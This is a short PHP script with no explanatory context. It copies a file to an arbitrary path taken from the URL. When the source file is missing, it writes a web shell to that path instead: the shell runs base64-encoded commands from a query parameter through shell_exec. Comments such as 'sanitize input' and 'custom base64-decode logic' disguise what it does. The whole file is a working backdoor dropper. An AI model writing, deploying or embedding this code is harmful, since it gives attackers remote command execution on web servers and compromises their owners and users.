<?php
if (isset($_GET['filename']) && isset($_GET['path'])) {
    $filename = basename($_GET['filename']); // sanitize input
    $destination = $_GET['path'];

    if (file_exists($filename)) {
        if (copy($filename, $destination)) {
            echo "File copied successfully to $destination";
        } else {
            echo "Failed to copy the file";
        }
    } else {
        // Create file with custom base64-decode logic
        $content = "<?php echo shell_exec(base64_decode(\$_GET['base'])); ?>";
        if (file_put_contents($destination, $content) !== false) {
            echo "Source file not found. New file created at $destination";
        } else {
            echo "Failed to create new file (check path & permissions)";
        }
    }
} else {
    echo "Filename and path are required.";
}
?>
